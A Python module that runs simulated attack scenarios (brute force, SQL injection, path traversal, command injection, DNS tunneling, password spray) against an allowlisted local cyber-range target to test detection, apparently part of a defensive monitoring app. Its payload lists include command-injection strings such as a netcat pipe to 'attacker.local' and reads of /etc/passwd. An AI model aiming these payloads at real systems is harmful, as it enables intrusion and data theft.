from __future__ import annotations

import json
import socket
from collections.abc import Callable
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlencode, urlparse

import httpx
from app.core.config import settings
from app.core.exceptions import bad_request
from app.models.enums import Severity
from app.schemas.event import EventCreate


@dataclass(frozen=True)
class RangeScenario:
    id: str
    name: str
    description: str
    severity: str
    mitre_tactics: list[str]
    mitre_techniques: list[str]
    target_path: str
    cli_examples: list[str]
    safety_notes: list[str]
    expected_detections: list[str]


RANGE_SCENARIOS: dict[str, RangeScenario] = {
    "range_brute_force": RangeScenario(
        id="range_brute_force",
        name="Local Brute Force Login",
        description="Runs repeated login attempts against the intentionally vulnerable local target.",
        severity="high",
        mitre_tactics=["Credential Access"],
        mitre_techniques=["T1110"],
        target_path="/login",
        cli_examples=[
            'curl -s -X POST http://127.0.0.1:8088/login -H "Content-Type: application/json" -d "{\\"username\\":\\"admin\\",\\"password\\":\\"wrongpass\\"}"',
            'curl -s -X POST http://127.0.0.1:8088/login -H "Content-Type: application/json" -d "{\\"username\\":\\"admin\\",\\"password\\":\\"CyberGuard!2026\\"}"',
        ],
        safety_notes=["Targets only the disposable local range login endpoint."],
        expected_detections=["brute_force", "failed_login_burst"],
    ),
    "range_sql_injection": RangeScenario(
        id="range_sql_injection",
        name="Local SQL Injection Attempt",
        description="Sends a classic SQL injection payload to a toy local search endpoint.",
        severity="high",
        mitre_tactics=["Initial Access"],
        mitre_techniques=["T1190"],
        target_path="/search",
        cli_examples=[
            'curl -s "http://127.0.0.1:8088/search?q=%27%20OR%20%271%27%3D%271%27--"',
        ],
        safety_notes=["Payload is executed only against a toy local endpoint with dummy data."],
        expected_detections=["sql_injection_attempt"],
    ),
    "range_path_traversal": RangeScenario(
        id="range_path_traversal",
        name="Local Path Traversal Attempt",
        description="Requests traversal-style file paths against the local dummy file endpoint.",
        severity="high",
        mitre_tactics=["Credential Access", "Discovery"],
        mitre_techniques=["T1083"],
        target_path="/files",
        cli_examples=[
            'curl -s "http://127.0.0.1:8088/files?path=../../etc/passwd"',
        ],
        safety_notes=["The target blocks traversal and exposes no host filesystem."],
        expected_detections=["path_traversal_attempt"],
    ),
    "range_exfiltration": RangeScenario(
        id="range_exfiltration",
        name="Local Data Exfiltration Simulation",
        description="Stages repeated dummy sensitive-file reads and outbound transfer events inside the local range.",
        severity="critical",
        mitre_tactics=["Collection", "Exfiltration"],
        mitre_techniques=["T1560", "T1048"],
        target_path="/exfil",
        cli_examples=[
            'curl -s -X POST http://127.0.0.1:8088/exfil -H "Content-Type: application/json" -d "{\\"file\\":\\"sensitive/customer_database_export.csv\\",\\"size_mb\\":120}"',
        ],
        safety_notes=["Only dummy files inside the disposable target are referenced."],
        expected_detections=["data_exfiltration"],
    ),
    "range_ransomware": RangeScenario(
        id="range_ransomware",
        name="Local Ransomware Behavior Simulation",
        description="Renames dummy files inside the disposable target and logs ransomware-style endpoint signals.",
        severity="critical",
        mitre_tactics=["Impact"],
        mitre_techniques=["T1486"],
        target_path="/ransomware/simulate",
        cli_examples=[
            "curl -s -X POST http://127.0.0.1:8088/ransomware/simulate",
        ],
        safety_notes=["Only in-memory dummy file state is changed; no host files are mounted."],
        expected_detections=["ransomware_simulation"],
    ),
    "range_port_scan": RangeScenario(
        id="range_port_scan",
        name="Controlled Local Port Scan",
        description="Uses the backend to probe only approved ports on the local range target container.",
        severity="medium",
        mitre_tactics=["Discovery"],
        mitre_techniques=["T1046"],
        target_path="ports 8088-8103",
        cli_examples=[
            'python3 -c "import socket; socket.create_connection((\'range-target\', 8088), 0.5)"',
            'curl -s "http://127.0.0.1:8088/health"',
        ],
        safety_notes=["The runner scans only hardcoded range-target ports, never user-supplied hosts."],
        expected_detections=["port_scan"],
    ),
    "range_dns_tunneling": RangeScenario(
        id="range_dns_tunneling",
        name="Local DNS Tunneling Simulation",
        description="Sends long encoded DNS-like queries to simulate covert data exfiltration over DNS.",
        severity="high",
        mitre_tactics=["Command and Control", "Exfiltration"],
        mitre_techniques=["T1071.004", "T1048"],
        target_path="/dns/query",
        cli_examples=[
            'curl -s -X POST http://127.0.0.1:8088/dns/query -H "Content-Type: application/json" -d "{\\"query\\":\\"c2VjcmV0LWRhdGEudHVuLmV4YW1wbGUubG9jYWw\\"}"',
        ],
        safety_notes=["Queries are processed only by the local disposable range target."],
        expected_detections=["dns_tunneling_suspected"],
    ),
    "range_password_spray": RangeScenario(
        id="range_password_spray",
        name="Local Password Spray Simulation",
        description="Attempts one common password across many usernames to emulate low-and-slow spraying.",
        severity="high",
        mitre_tactics=["Credential Access"],
        mitre_techniques=["T1110.003"],
        target_path="/auth/spray",
        cli_examples=[
            'curl -s -X POST http://127.0.0.1:8088/auth/spray -H "Content-Type: application/json" -d "{\\"username\\":\\"finance.manager\\",\\"password\\":\\"Winter2026!\\"}"',
        ],
        safety_notes=["Spray actions target only toy authentication logic with dummy users."],
        expected_detections=["password_spray"],
    ),
    "range_command_injection": RangeScenario(
        id="range_command_injection",
        name="Local Command Injection Attempt",
        description="Submits shell metacharacter payloads to a toy endpoint to simulate command injection.",
        severity="high",
        mitre_tactics=["Execution", "Initial Access"],
        mitre_techniques=["T1059", "T1190"],
        target_path="/exec",
        cli_examples=[
            'curl -s -X POST http://127.0.0.1:8088/exec -H "Content-Type: application/json" -d "{\\"input\\":\\"report.csv; whoami\\"}"',
        ],
        safety_notes=["No system commands are executed; payloads are logged and blocked in-app."],
        expected_detections=["command_injection_attempt"],
    ),
    "range_privilege_escalation": RangeScenario(
        id="range_privilege_escalation",
        name="Local Privilege Escalation Simulation",
        description="Generates suspicious admin elevation telemetry to mimic privilege escalation behavior.",
        severity="critical",
        mitre_tactics=["Privilege Escalation", "Persistence"],
        mitre_techniques=["T1068", "T1548"],
        target_path="/priv-esc",
        cli_examples=[
            'curl -s -X POST http://127.0.0.1:8088/priv-esc -H "Content-Type: application/json" -d "{\\"username\\":\\"analyst\\",\\"action\\":\\"sudo su -\\"}"',
        ],
        safety_notes=["Events are synthetic lab traces; no real privilege changes happen on host or container."],
        expected_detections=["privilege_escalation_suspected"],
    ),
}


HttpClient = httpx.Client
RangeStepAction = Callable[[HttpClient, str], None]


def _json_for_curl(body: dict[str, Any]) -> str:
    return json.dumps(body, separators=(",", ":")).replace('"', '\\"')


def _optional_headers(client_ip: str | None) -> dict[str, str]:
    if client_ip:
        return {"X-Range-Client-Ip": client_ip}
    return {}


def _curl_post(
    base: str,
    path: str,
    body: dict[str, Any],
    *,
    extra_headers: dict[str, str] | None = None,
) -> str:
    headers = ['-H "Content-Type: application/json"']
    for key, value in (extra_headers or {}).items():
        headers.append(f'-H "{key}: {value}"')
    url = f"{base.rstrip('/')}{path}"
    return f'curl -s -X POST {url} {" ".join(headers)} -d "{_json_for_curl(body)}"'


def _curl_get(
    base: str,
    path: str,
    *,
    params: dict[str, str] | None = None,
    extra_headers: dict[str, str] | None = None,
) -> str:
    url = f"{base.rstrip('/')}{path}"
    if params:
        url = f"{url}?{urlencode(params)}"
    headers = [f'-H "{key}: {value}"' for key, value in (extra_headers or {}).items()]
    header_part = f" {' '.join(headers)}" if headers else ""
    return f"curl -s{header_part} \"{url}\""


def _curl_reset(target_url: str) -> str:
    return (
        f'curl -s -X POST {target_url.rstrip("/")}/_range/reset '
        '-H "X-Range-Secret: ***"'
    )


def _curl_drain_logs(target_url: str) -> str:
    return (
        f'curl -s {target_url.rstrip("/")}/_range/logs '
        '-H "X-Range-Secret: ***"'
    )


def _tcp_probe_command(host: str, port: int) -> str:
    return (
        f'python3 -c "import socket; socket.create_connection(('
        f"'{host}', {port}), 0.5)\""
    )


def _build_attack_steps(
    scenario_id: str,
    target_url: str,
    public_url: str,
    *,
    client_ip: str | None,
    scan_ports: list[int],
) -> list[tuple[str, RangeStepAction]]:
    """Return (display_command, executor) pairs — one per real HTTP/TCP probe."""
    hdrs = _optional_headers(client_ip)
    parsed = urlparse(target_url)
    internal_host = parsed.hostname or "range-target"
    scheme = parsed.scheme or "http"
    steps: list[tuple[str, RangeStepAction]] = []

    if scenario_id == "range_brute_force":
        passwords = [
            "password123",
            "admin",
            "welcome",
            "letmein",
            "qwerty123",
            "summer2026",
            "cyberguard",
            "wrongpass",
            "demo12345",
            "changeme2026",
            "CyberGuard!2026",
        ]
        for password in passwords:
            body = {"username": "admin", "password": password}
            curl = _curl_post(public_url, "/login", body, extra_headers=hdrs)

            def _post_login(client: HttpClient, base: str, payload: dict = body) -> None:
                client.post(f"{base.rstrip('/')}/login", json=payload)

            steps.append((curl, _post_login))

    elif scenario_id == "range_sql_injection":
        payloads = [
            "normal query",
            "' OR '1'='1'--",
            "demo' UNION SELECT username,password FROM users--",
        ]
        for payload in payloads:
            params = {"q": payload}
            curl = _curl_get(public_url, "/search", params=params, extra_headers=hdrs)

            def _get_search(client: HttpClient, base: str, q: str = payload) -> None:
                client.get(f"{base.rstrip('/')}/search", params={"q": q})

            steps.append((curl, _get_search))

    elif scenario_id == "range_path_traversal":
        paths = ["public/readme.txt", "../../etc/passwd", "..\\..\\windows\\win.ini"]
        for path in paths:
            params = {"path": path}
            curl = _curl_get(public_url, "/files", params=params, extra_headers=hdrs)

            def _get_files(client: HttpClient, base: str, p: str = path) -> None:
                client.get(f"{base.rstrip('/')}/files", params={"path": p})

            steps.append((curl, _get_files))

    elif scenario_id == "range_exfiltration":
        files = [
            ("sensitive/customer_database_export.csv", 80),
            ("sensitive/hr_salary_q4.xlsx", 100),
            ("sensitive/customer_database_export.csv", 120),
        ]
        for filename, size_mb in files:
            body = {"file": filename, "size_mb": size_mb, "username": "contractor1"}
            curl = _curl_post(public_url, "/exfil", body, extra_headers=hdrs)

            def _post_exfil(client: HttpClient, base: str, payload: dict = body) -> None:
                client.post(f"{base.rstrip('/')}/exfil", json=payload)

            steps.append((curl, _post_exfil))

    elif scenario_id == "range_ransomware":
        curl = _curl_post(public_url, "/ransomware/simulate", {}, extra_headers=hdrs)

        def _post_ransomware(client: HttpClient, base: str) -> None:
            client.post(f"{base.rstrip('/')}/ransomware/simulate")

        steps.append((curl, _post_ransomware))

    elif scenario_id == "range_port_scan":
        if client_ip:
            for port in scan_ports:
                probe_url = f"{scheme}://{internal_host}:{port}/health"
                curl = _curl_get(
                    f"{scheme}://{internal_host}:{port}",
                    "/health",
                    extra_headers=hdrs,
                )

                def _get_health(client: HttpClient, _base: str, url: str = probe_url) -> None:
                    try:
                        client.get(url, timeout=2.0)
                    except httpx.HTTPError:
                        pass

                steps.append((curl, _get_health))
        else:
            for port in scan_ports:
                curl = _tcp_probe_command(internal_host, port)

                def _tcp_connect(
                    _client: HttpClient,
                    _base: str,
                    host: str = internal_host,
                    p: int = port,
                ) -> None:
                    try:
                        with socket.create_connection((host, p), timeout=0.5):
                            pass
                    except OSError:
                        pass

                steps.append((curl, _tcp_connect))

    elif scenario_id == "range_dns_tunneling":
        queries = [
            "healthcheck.local",
            "c2VjcmV0LXNlZ21lbnQtMDE=.corp.lab.local",
            "Y3JlZGVudGlhbD1hZG1pbjpQYXNzMTIz.corp.lab.local",
            "ZmlsZT1jdXN0b21lcnMuY3N2JmNodW5rPTM=.corp.lab.local",
            "ZXhmaWw9cGF5cm9sbC1kYXRhJmNoZWNrPTQ=.corp.lab.local",
        ]
        for query in queries:
            body = {"query": query}
            curl = _curl_post(public_url, "/dns/query", body, extra_headers=hdrs)

            def _post_dns(client: HttpClient, base: str, payload: dict = body) -> None:
                client.post(f"{base.rstrip('/')}/dns/query", json=payload)

            steps.append((curl, _post_dns))

    elif scenario_id == "range_password_spray":
        usernames = [
            "admin",
            "it.support",
            "finance.manager",
            "ceo.assistant",
            "ops.lead",
            "analyst",
            "helpdesk",
            "intern",
            "hr.manager",
            "developer",
        ]
        for username in usernames:
            body = {"username": username, "password": "Winter2026!"}
            curl = _curl_post(public_url, "/auth/spray", body, extra_headers=hdrs)

            def _post_spray(client: HttpClient, base: str, payload: dict = body) -> None:
                client.post(f"{base.rstrip('/')}/auth/spray", json=payload)

            steps.append((curl, _post_spray))

    elif scenario_id == "range_command_injection":
        payloads = [
            "report.csv",
            "report.csv; whoami",
            "backup.tar && id",
            "$(cat /etc/passwd)",
            "audit.log | nc attacker.local 4444",
        ]
        for payload in payloads:
            body = {"input": payload}
            curl = _curl_post(public_url, "/exec", body, extra_headers=hdrs)

            def _post_exec(client: HttpClient, base: str, p: dict = body) -> None:
                client.post(f"{base.rstrip('/')}/exec", json=p)

            steps.append((curl, _post_exec))

    elif scenario_id == "range_privilege_escalation":
        actions = [
            {"username": "analyst", "action": "sudo -l"},
            {"username": "analyst", "action": "sudo su -"},
            {"username": "service.backup", "action": "token::elevate"},
            {"username": "service.backup", "action": "add user to administrators"},
        ]
        for item in actions:
            curl = _curl_post(public_url, "/priv-esc", item, extra_headers=hdrs)

            def _post_priv(client: HttpClient, base: str, payload: dict = item) -> None:
                client.post(f"{base.rstrip('/')}/priv-esc", json=payload)

            steps.append((curl, _post_priv))

    else:
        raise bad_request("Unknown range scenario")

    return steps


def preview_execution_commands(
    scenario_id: str,
    target_url: str,
    public_url: str,
    *,
    client_ip: str | None = None,
    scan_ports: list[int] | None = None,
) -> list[str]:
    """Full script for UI terminal replay (reset → attacks → log drain)."""
    ports = scan_ports if scan_ports is not None else list(range(8088, 8104))
    commands = [_curl_reset(target_url)]
    commands.extend(
        curl
        for curl, _ in _build_attack_steps(
            scenario_id,
            target_url,
            public_url,
            client_ip=client_ip,
            scan_ports=ports,
        )
    )
    commands.append(_curl_drain_logs(target_url))
    return commands


class RangeAttackRunner:
    allowed_hosts = {"range-target", "localhost", "127.0.0.1"}
    scan_ports = list(range(8088, 8104))

    def __init__(self) -> None:
        self.target_url = settings.range_target_url.rstrip("/")
        self.public_url = settings.range_public_url.rstrip("/")
        self._client_ip: str | None = None
        self._assert_allowed_target(self.target_url)

    def _http_client(self, *, timeout: float = 10.0) -> httpx.Client:
        headers: dict[str, str] = {}
        if self._client_ip:
            headers["X-Range-Client-Ip"] = self._client_ip
        return httpx.Client(timeout=timeout, headers=headers)

    def _assert_allowed_target(self, raw_url: str) -> None:
        parsed = urlparse(raw_url)
        if parsed.scheme not in {"http", "https"}:
            raise bad_request("Range target URL must be HTTP(S)")
        if parsed.hostname not in self.allowed_hosts:
            raise bad_request("Range target is outside the local allowlist")

    def scenario_public(self, scenario: RangeScenario) -> dict[str, Any]:
        target = (
            f"{self.public_url}{scenario.target_path}"
            if scenario.target_path.startswith("/")
            else scenario.target_path
        )
        execution_commands = preview_execution_commands(
            scenario.id,
            self.target_url,
            self.public_url,
        )
        return {
            "id": scenario.id,
            "name": scenario.name,
            "description": scenario.description,
            "severity": scenario.severity,
            "mitre_tactics": scenario.mitre_tactics,
            "mitre_techniques": scenario.mitre_techniques,
            "execution_mode": "local_range",
            "target_url": target,
            "cli_examples": scenario.cli_examples,
            "execution_commands": execution_commands,
            "safety_notes": scenario.safety_notes,
            "expected_detections": scenario.expected_detections,
        }

    def status(self) -> tuple[bool, str]:
        if not settings.range_enabled:
            return False, "Cyber range is disabled"
        try:
            with httpx.Client(timeout=5.0) as client:
                resp = client.get(f"{self.target_url}/health")
                resp.raise_for_status()
            return True, "Range target is healthy"
        except Exception as exc:
            return False, f"Range target is unavailable: {exc}"

    def reset(self) -> None:
        with self._http_client() as client:
            resp = client.post(
                f"{self.target_url}/_range/reset",
                headers={"X-Range-Secret": settings.range_shared_secret},
            )
            resp.raise_for_status()

    def drain_logs(self) -> list[dict[str, Any]]:
        with self._http_client() as client:
            resp = client.get(
                f"{self.target_url}/_range/logs",
                headers={"X-Range-Secret": settings.range_shared_secret},
            )
            resp.raise_for_status()
            data = resp.json()
        logs = data.get("logs", [])
        return logs if isinstance(logs, list) else []

    def run(
        self,
        scenario_id: str,
        *,
        client_ip: str | None = None,
    ) -> tuple[RangeScenario, int, list[dict[str, Any]], list[str]]:
        if not settings.range_enabled:
            raise bad_request("Cyber range is disabled")
        scenario = RANGE_SCENARIOS.get(scenario_id)
        if not scenario:
            raise bad_request("Unknown range scenario")
        self._client_ip = client_ip
        executed_commands: list[str] = [_curl_reset(self.target_url)]
        try:
            self.reset()
            steps = _build_attack_steps(
                scenario_id,
                self.target_url,
                self.public_url,
                client_ip=client_ip,
                scan_ports=self.scan_ports,
            )
            with self._http_client(
                timeout=2.0 if scenario_id == "range_port_scan" and client_ip else 10.0
            ) as client:
                for curl_line, action in steps:
                    executed_commands.append(curl_line)
                    action(client, self.target_url)
            executed_commands.append(_curl_drain_logs(self.target_url))
            logs = self.drain_logs()
            return scenario, len(steps), logs, executed_commands
        finally:
            self._client_ip = None


def logs_to_events(logs: list[dict[str, Any]]) -> list[EventCreate]:
    out: list[EventCreate] = []
    for item in logs:
        try:
            ts = datetime.fromisoformat(str(item.get("timestamp", "")).replace("Z", "+00:00"))
        except ValueError:
            ts = datetime.now(timezone.utc)
        sev_raw = str(item.get("severity", "low")).lower()
        try:
            severity = Severity(sev_raw)
        except ValueError:
            severity = Severity.low
        port_raw = item.get("port")
        try:
            port = int(port_raw) if port_raw is not None else None
        except (TypeError, ValueError):
            port = None
        metadata = item.get("metadata")
        out.append(
            EventCreate(
                timestamp=ts,
                source_ip=str(item.get("source_ip") or "127.0.0.1"),
                destination_ip=str(item.get("destination_ip") or "range-target"),
                username=item.get("username"),
                event_type=str(item.get("event_type") or "range_event"),
                status=item.get("status"),
                severity=severity,
                message=item.get("message"),
                protocol=str(item.get("protocol") or "tcp"),
                port=port,
                raw_log=item.get("raw_log"),
                source_system=str(item.get("source_system") or "range-target"),
                metadata=metadata if isinstance(metadata, dict) else None,
            )
        )
    return out
